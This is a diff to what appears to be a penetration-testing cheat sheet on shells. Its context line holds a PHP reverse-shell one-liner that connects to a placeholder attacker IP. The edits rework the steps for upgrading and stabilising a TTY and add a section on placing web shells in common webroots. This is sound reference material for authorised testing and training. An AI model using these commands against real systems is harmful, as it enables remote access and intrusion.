@@ -32,23 +32,26 @@ php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Then:
-
-```text
-Ctrl-Z
-```
-
-On attacker:
+Then press `Ctrl-Z`. On attacker:
 
 ```bash
 stty raw -echo; fg
 ```
 
-Then in shell:
+Then in the target shell:
 
 ```bash
 export TERM=xterm
-stty rows 40 columns 120
+```
+
+Match the target terminal to the attacker's dimensions:
+
+```bash
+# Attacker
+stty size
+
+# Target — substitute the reported values
+stty rows <ROWS> columns <COLUMNS>
 ```
 
 Reset broken terminal:
@@ -56,6 +59,19 @@ Reset broken terminal:
 ```bash
 reset
 ```
+
+## Web Shells
+
+A web shell executes commands through a server-side script placed in a writable webroot. Confirm the application language and actual document root first.
+
+| Stack | Common webroots |
+|---|---|
+| Apache | `/var/www/html/`, `/var/www/` |
+| Nginx | `/usr/share/nginx/html/`, configured `root` |
+| IIS | `C:\\inetpub\\wwwroot` |
+| XAMPP | `C:\\xampp\\htdocs` |
+
+Treat a web shell as an initial foothold: identify the service account, then transition to a stable shell where permitted.
 
 ## Bind Shell Concept
 
